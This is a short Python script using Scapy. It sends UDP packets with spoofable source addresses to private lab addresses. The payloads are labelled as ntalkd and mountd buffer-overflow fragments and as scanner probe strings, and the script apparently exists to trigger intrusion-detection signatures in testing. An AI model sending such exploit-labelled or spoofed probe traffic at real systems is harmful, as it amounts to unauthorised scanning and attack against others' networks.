#!/usr/bin/env python2
from scapy.all import *
import sys, argparse


ntalkdBOF="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
mountdBOF="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"


def t_exploit(s,d,i,c):
    pkt = IP(src=s, dst=d)/UDP(dport=518)/Raw(load=ntalkdBOF)
    send(pkt, iface=i, count=c)
    pkt = IP(src=s, dst=d)/UDP(dport=635)/Raw(load=mountdBOF)
    send(pkt, iface=i, count=c)


def t_recon(s,d,i,c):
    pkt = IP(src=s, dst=d)/UDP(dport=7)/Raw(load="cybercop")
    send(pkt, iface=i, count=c)
    pkt = IP(src=s, dst=d)/UDP(dport=10081)/Raw(load="Amanda")
    send(pkt, iface=i, count=c)


src='192.168.56.180'
dst='192.168.56.1'
iface='eth1'
count=1
t_exploit(src,dst,iface,count)
t_recon(src,dst,iface,count)

